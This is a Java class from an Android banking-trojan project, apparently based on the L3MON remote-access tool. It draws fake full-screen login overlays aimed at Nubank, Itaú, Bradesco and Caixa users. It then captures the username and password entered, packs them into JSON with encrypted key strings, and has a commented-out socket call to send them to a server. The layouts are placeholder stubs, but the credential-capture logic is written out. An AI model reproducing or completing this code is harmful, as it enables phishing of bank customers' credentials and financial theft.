package com.etechd.l3mon.managers;

import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Build;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import org.json.JSONObject;

import com.etechd.l3mon.StringCrypto;

public class FakeWebViewOverlay {

    private final Context context;
    private final WindowManager windowManager;
    private View overlayView;
    private boolean isShowing = false;
    private String currentBank = "";

    public FakeWebViewOverlay(Context context) {
        this.context = context;
        this.windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
    }

    /**
     * Mostra overlay falso específico para cada banco
     */
    public void showFakeLoginOverlay(String bankName) {
        if (isShowing) {
            hideOverlay();
        }

        currentBank = bankName.toLowerCase();

        try {
            WindowManager.LayoutParams params = createOverlayParams();
            overlayView = createBankSpecificLayout(bankName);

            if (overlayView != null) {
                windowManager.addView(overlayView, params);
                isShowing = true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private WindowManager.LayoutParams createOverlayParams() {
        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT);

        params.gravity = Gravity.TOP | Gravity.START;
        return params;
    }

    /**
     * Cria layout diferente dependendo do banco
     */
    private View createBankSpecificLayout(String bankName) {
        View view = null;
        LayoutInflater inflater = LayoutInflater.from(context);

        switch (bankName.toLowerCase()) {
            case "nubank":
                view = createNubankFakeLayout(inflater);
                break;
            case "itau":
                view = createItauFakeLayout(inflater);
                break;
            case "bradesco":
                view = createBradescoFakeLayout(inflater);
                break;
            case "caixa":
                view = createCaixaFakeLayout(inflater);
                break;
            default:
                view = createGenericBankLayout(inflater, bankName);
                break;
        }

        setupCaptureListeners(view, bankName);
        return view;
    }

    // ==================== LAYOUTS POR BANCO ====================
    private View createNubankFakeLayout(LayoutInflater inflater) {
        View view = inflater.inflate(android.R.layout.simple_list_item_1, null);
        return view;
    }

    private View createItauFakeLayout(LayoutInflater inflater) {
        View view = inflater.inflate(android.R.layout.simple_list_item_1, null);
        return view;
    }

    private View createBradescoFakeLayout(LayoutInflater inflater) {
        View view = inflater.inflate(android.R.layout.simple_list_item_1, null);
        return view;
    }

    private View createCaixaFakeLayout(LayoutInflater inflater) {
        View view = inflater.inflate(android.R.layout.simple_list_item_1, null);
        return view;
    }

    private View createGenericBankLayout(LayoutInflater inflater, String bankName) {
        View view = inflater.inflate(android.R.layout.simple_list_item_1, null);
        return view;
    }

    // ==================== CAPTURA DE DADOS ====================
    private void setupCaptureListeners(View view, String bankName) {
        if (view == null)
            return;

        Button loginButton = view.findViewById(android.R.id.button1); // Ajuste conforme seu layout
        if (loginButton != null) {
            loginButton.setOnClickListener(v -> {
                captureCredentials(view, bankName);
                hideOverlay();
            });
        }
    }

    private void captureCredentials(View view, String bankName) {
        try {
            EditText usernameField = view.findViewById(android.R.id.text1);
            EditText passwordField = view.findViewById(android.R.id.text2);

            String username = usernameField != null ? usernameField.getText().toString() : "";
            String password = passwordField != null ? passwordField.getText().toString() : "";

            JSONObject capture = new JSONObject();

            // === CHAVES JSON CRIPTOGRAFADAS ===
            capture.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="),
                    StringCrypto.d("u+cdYuBWQ+ejLj0Lm4hOL7OQ4LwyFs9Bb+K7gGSnc2I=")); // "action" =
                                                                                     // "fake_overlay_capture"
            capture.put(StringCrypto.d("bftMHTJO9AYrI3XBQoExcQ=="), bankName); // "bank"
            capture.put(StringCrypto.d("KYySL2f7hb2Jfz0mpUztvw=="), username); // "username"
            capture.put(StringCrypto.d("Jy5jW50bgS6lqjqpYWApfQ=="), password); // "password"
            capture.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"

            // Enviar para servidor
            // ConnectionManager.ioSocket.emit("0xWV", capture);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void hideOverlay() {
        if (overlayView != null && isShowing) {
            try {
                windowManager.removeView(overlayView);
            } catch (Exception ignored) {
            }
            isShowing = false;
            overlayView = null;
            currentBank = "";
        }
    }

    public boolean isShowing() {
        return isShowing;
    }

    public String getCurrentBank() {
        return currentBank;
    }
}